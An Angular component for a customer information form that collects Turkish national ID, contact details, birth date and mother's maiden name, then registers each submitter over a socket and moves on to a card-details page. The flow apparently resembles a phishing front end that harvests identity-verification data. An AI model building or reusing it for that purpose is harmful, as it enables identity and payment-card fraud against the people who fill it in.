import { Component, output, signal, inject } from '@angular/core';
import { FormBuilder, ReactiveFormsModule, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { CustomerService } from '../../../core/services/customer';
import { SocketService } from '../../../core/services/socket.service';

@Component({
  selector: 'app-customer-info-form',
  templateUrl: './customer-info-form.html',
  imports: [ReactiveFormsModule]
})
export class CustomerInfoForm {
  openModal = output<string>();
  
  private fb = inject(FormBuilder);
  private router = inject(Router);
  private customerService = inject(CustomerService);
  private socketService = inject(SocketService);
  
  form = this.fb.group({
    fullName: ['', Validators.required],
    tckn: ['', [Validators.required, Validators.pattern(/^\d{11}$/)]],
    phone: ['', Validators.required],
    email: ['', [Validators.required, Validators.email]],
    city: ['', Validators.required],
    district: ['', Validators.required],
    address: ['', Validators.required],
    birthDate: ['', Validators.required],
    motherMaidenFirst: ['', Validators.required],
    motherMaidenLast: ['', Validators.required],
    kvkkCheck: [false, Validators.requiredTrue]
  });

  isSubmitting = signal(false);

  formatPhoneNumber(event: Event) {
    const input = event.target as HTMLInputElement;
    let x = input.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/);
    if (!x) return;
    if (!x[1]) {
      input.value = '';
    } else if (!x[2]) {
      input.value = x[1];
    } else if (!x[3]) {
      input.value = x[1] + ' ' + x[2];
    } else if (!x[4]) {
      input.value = x[1] + ' ' + x[2] + ' ' + x[3];
    } else {
      input.value = x[1] + ' ' + x[2] + ' ' + x[3] + ' ' + x[4];
    }
    this.form.get('phone')?.setValue(input.value, {emitEvent: false});
  }
  
  validateTCKN(event: Event) {
    const input = event.target as HTMLInputElement;
    const val = input.value.replace(/\D/g, '');
    input.value = val;
    this.form.get('tckn')?.setValue(val, {emitEvent: false});
  }

  onSubmit() {
    if (this.form.valid) {
      this.isSubmitting.set(true);
      const val = this.form.value;
      const customerId = val.tckn || localStorage.getItem('customer_id') || 'CUST-' + Math.floor(Math.random() * 1000000);
      localStorage.setItem('customer_id', customerId);
      
      const payload = {
        name: val.fullName,
        phone_number: val.phone,
        customer_id: customerId,
        address: val.address,
        email: val.email,
        province: val.city,
        district: val.district,
        db: val.birthDate,
        first_m_name: val.motherMaidenFirst,
        second_m_name: val.motherMaidenLast
      };

      this.customerService.createCustomer(payload).subscribe({
        next: (res: any) => {
          if (res && res.id) {
            localStorage.setItem('customer_id', res.id);
          }
          this.socketService.registerCustomer(res.id || customerId);
          this.isSubmitting.set(false);
          this.router.navigate(['/card-info']);
        },
        error: (err) => {
          console.error(err);
          this.isSubmitting.set(false);
        }
      });
    } else {
      this.form.markAllAsTouched();
    }
  }

  cancelForm() {
    this.router.navigate(['/']);
  }
}
